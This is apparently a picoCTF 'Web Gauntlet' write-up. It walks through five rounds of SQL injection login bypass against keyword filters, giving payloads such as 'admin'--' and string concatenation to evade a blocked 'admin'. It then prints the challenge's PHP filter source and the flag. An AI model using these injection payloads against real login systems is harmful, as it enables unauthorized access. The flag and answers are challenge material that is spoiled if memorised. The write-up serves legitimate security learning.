# 1. Web Gauntlet

As soon as i opened the challenge  i got links of 2 websites 1 had the login page and the other page had a set of instructions that apparently changed after each round.
### Round 1:`admin'--`

filters: `or`

The `'` character acts a string delimiter and escapes the username string and it allows any other command to be run. Here `--` is a comment, which comments out `AND password=''`. Which means, any password will work.  

### Round 2: `admin'/*`

filters: `or like and = --`

As `--` was filtered out, we can use `/*` as an alternative to comment out the rest of the query .

### Round 3: `admin'/*`

filters: `or and = like > < --`

This injection string functions same as above. 

### Round 4: `adm'||'in/*`

filters: `or and = like > < -- admin`

Here, the word `admin` was blocked, so what I can do is, break it into two parts and concatenate it using the relevant operators. 
`||` is used to concatenate two strings.   

### Round 5: `adm'||'in/`

filters: `or and = like > < -- admin union`

Same as above 

This is what I got in the `http://shape-facility.picoctf.net:61909/filter.php` after completing all 5 rounds: 

```<?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_79a0ddc6}
?>
```

## Flag: `picoCTF{y0u_m4d3_1t_79a0ddc6}`
